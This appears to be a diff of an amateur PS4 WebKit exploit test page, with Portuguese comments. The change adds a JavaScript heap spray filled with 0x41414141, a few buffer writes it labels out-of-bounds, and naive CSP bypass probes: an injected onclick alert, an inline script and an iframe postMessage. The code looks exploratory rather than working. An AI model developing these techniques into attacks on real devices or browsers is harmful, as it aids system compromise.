@@ -2,11 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Exploit - Testes OOB Extremos</title>
-</head>
+    <title>PS4 WebKit Exploit - Testes Combinados (Heap & CSP)</title>
+    <style>
+        body { background-color: lightblue; }
+    </style>
+    </head>
 <body>
-    <h1>Testes OOB Extremos</h1>
+    <h1>Testes Combinados (Heap & CSP)</h1>
     <div id="output"></div>
+    <iframe id="cspFrame" sandbox="allow-scripts"></iframe>
     <script>
         const log = (message, type = 'info') => {
             const outputDiv = document.getElementById('output');
@@ -17,32 +21,17 @@
             }
         };
 
-        let globalTargetObject = {};
+        let heapSprayArrays = [];
+        const heapSpraySize = 1000; // Número de alocações para o Heap Spray
+        const sprayElementSize = 0x1000; // Tamanho de cada elemento alocado (4KB)
 
         function prepareData() {
             log("Função prepareData() iniciada.", 'warning');
-            let bufferSize;
-            let buffer;
-            let view;
-            try {
-                bufferSize = 64;
-                log(`Tamanho do buffer dentro de prepareData: ${bufferSize}`);
-                buffer = new ArrayBuffer(bufferSize);
-                log(`ArrayBuffer criado dentro de prepareData.`);
-                view = new Uint8Array(buffer);
-                log(`Uint8Array criado dentro de prepareData.`);
-                globalTargetObject = {
-                    flag1: true, flag2: false, counter: 10, name: "Test", array: [1, 2, 3],
-                    floatValue: 3.14, longValue: 1234567890123, nestedObject: { a: 1, b: "hello" },
-                    privileged: false, bypassMethod: "default"
-                };
-                log(`Objeto inicial (prepareData): ${JSON.stringify(globalTargetObject)}`);
-                log("Função prepareData() concluída com sucesso.", 'success');
-                return { buffer, view, bufferSize };
-            } catch (error) {
-                log(`Erro dentro de prepareData(): ${error}`, 'error');
-                return null; // Indica falha
-            }
+            let bufferSize = 64;
+            let buffer = new ArrayBuffer(bufferSize);
+            let view = new Uint8Array(buffer);
+            log("Função prepareData() concluída.", 'success');
+            return { buffer, view, bufferSize };
         }
 
         function performOOBWriteIsolated(view, bufferSize, offset, value, testName) {
@@ -62,29 +51,57 @@
             }
         }
 
-        function objectManipulationTestsIsolated() {
-            log("\n--- Testes de Manipulação de Objeto Isolados ---", 'critical');
+        function triggerHeapSpray() {
+            log("\n--- Iniciando Heap Spray ---", 'critical');
             try {
-                log(`objectManipulationTestsIsolated: Acessando propriedades: ${globalTargetObject.name}, ${globalTargetObject.counter}`);
-                globalTargetObject.newValue = "newValue";
-                log(`objectManipulationTestsIsolated: Adicionando propriedade: ${JSON.stringify(globalTargetObject)}`);
-                delete globalTargetObject.flag1;
-                log(`objectManipulationTestsIsolated: Deletando propriedade: ${JSON.stringify(globalTargetObject)}`);
+                for (let i = 0; i < heapSpraySize; i++) {
+                    const sprayArray = new Array(sprayElementSize / 4); // Aloca array de inteiros
+                    for (let j = 0; j < sprayArray.length; j++) {
+                        sprayArray[j] = 0x41414141; // Preenche com um padrão
+                    }
+                    heapSprayArrays.push(sprayArray);
+                    if (i % 100 === 0) {
+                        log(`Heap Spray: Alocado ${i + 1}/${heapSpraySize} objetos.`);
+                    }
+                }
+                log(`Heap Spray concluído: ${heapSprayArrays.length} objetos alocados.`);
             } catch (error) {
-                log(`objectManipulationTestsIsolated: Erro: ${error}`, 'error');
+                log(`Erro durante o Heap Spray: ${error}`, 'error');
             }
         }
 
-        function arrayManipulationTestsIsolated() {
-            log("\n--- Testes de Manipulação de Array Isolados ---", 'critical');
+        function testCSPBypassAttempts() {
+            log("\n--- Testando Possíveis Bypasses de CSP ---", 'critical');
             try {
-                log(`arrayManipulationTestsIsolated: Array inicial: ${globalTargetObject.array}`);
-                globalTargetObject.array.push(4);
-                log(`arrayManipulationTestsIsolated: Após push: ${globalTargetObject.array}`);
-                globalTargetObject.array[0] = 100;
-                log(`arrayManipulationTestsIsolated: Após modificação de índice: ${globalTargetObject.array}`);
+                // 1. Tentativa de executar código inline via atributo event handler
+                const inlineEventHandler = document.createElement('div');
+                inlineEventHandler.setAttribute('onclick', 'alert("CSP Bypass?")');
+                inlineEventHandler.textContent = 'Clique para testar CSP';
+                document.body.appendChild(inlineEventHandler);
+                log("Teste CSP: Elemento com event handler 'onclick' injetado.");
+
+                // 2. Tentativa de injetar uma tag <script> com conteúdo inline (pode ser bloqueado por 'unsafe-inline')
+                const inlineScript = document.createElement('script');
+                inlineScript.textContent = 'try { console.log("Inline script test"); } catch (e) { log("Erro inline script: " + e, "warning"); }';
+                document.body.appendChild(inlineScript);
+                log("Teste CSP: Tag <script> com código inline injetada.");
+
+                // 3. Tentativa de manipular o 'sandbox' de um iframe (algumas configurações podem ser vulneráveis)
+                const cspFrame = document.getElementById('cspFrame');
+                if (cspFrame) {
+                    try {
+                        cspFrame.contentWindow.postMessage('test', '*');
+                        window.addEventListener('message', (event) => {
+                            log(`Teste CSP (iframe): Mensagem recebida: ${event.data}`);
+                        });
+                        log("Teste CSP (iframe): Mensagem postada para iframe.");
+                    } catch (e) {
+                        log(`Erro ao interagir com iframe: ${e}`, 'warning');
+                    }
+                }
+
             } catch (error) {
-                log(`arrayManipulationTestsIsolated: Erro: ${error}`, 'error');
+                log(`Erro durante os testes de CSP: ${error}`, 'error');
             }
         }
 
@@ -95,32 +112,17 @@
                 log("mainExploit(): prepareData() retornou dados.");
                 const { view, bufferSize } = data;
 
-                // Testes dentro dos limites
-                for (let i = 0; i < bufferSize; i++) {
-                    performOOBWriteIsolated(view, bufferSize, i, i, `Offset ${i}`);
-                }
+                // Realiza alguns testes OOB básicos (para manter a linha de investigação principal)
+                performOOBWriteIsolated(view, bufferSize, 0, 0xAA, "OOB Test 1");
+                performOOBWriteIsolated(view, bufferSize, 8, 0xBB, "OOB Test 2");
 
-                // Testes ligeiramente fora dos limites superiores
-                performOOBWriteIsolated(view, bufferSize, bufferSize, 0xAA, `Offset ${bufferSize} (OOB+)`);
-                performOOBWriteIsolated(view, bufferSize, bufferSize + 1, 0xBB, `Offset ${bufferSize + 1} (OOB++)`);
-                performOOBWriteIsolated(view, bufferSize, bufferSize + 2, 0xCC, `Offset ${bufferSize + 2} (OOB+++)`);
+                // Inicia o Heap Spray
+                triggerHeapSpray();
 
-                // Testes ligeiramente fora dos limites inferiores
-                performOOBWriteIsolated(view, bufferSize, -1, 0xDD, `Offset -1 (OOB-)`);
-                performOOBWriteIsolated(view, bufferSize, -2, 0xEE, `Offset -2 (OOB--)`);
-                performOOBWriteIsolated(view, bufferSize, -3, 0xFF, `Offset -3 (OOB---)`);
+                // Tenta alguns bypasses de CSP
+                testCSPBypassAttempts();
 
-                // Testes com valores diferentes
-                performOOBWriteIsolated(view, bufferSize, 10, 0x12345, `Offset 10, Valor 0x12345 (Truncado)`);
-                performOOBWriteIsolated(view, bufferSize, 20, -1, `Offset 20, Valor -1 (Interpretado)`);
-
-                // Testes de manipulação de objetos isolados
-                objectManipulationTestsIsolated();
-
-                // Testes de manipulação de array isolados
-                arrayManipulationTestsIsolated();
-
-                log(`\nmainExploit(): Objeto APÓS todos os testes: ${JSON.stringify(globalTargetObject)}`);
+                log(`\nmainExploit(): Concluído.`);
 
             } else {
                 log("mainExploit(): prepareData() falhou.", 'error');
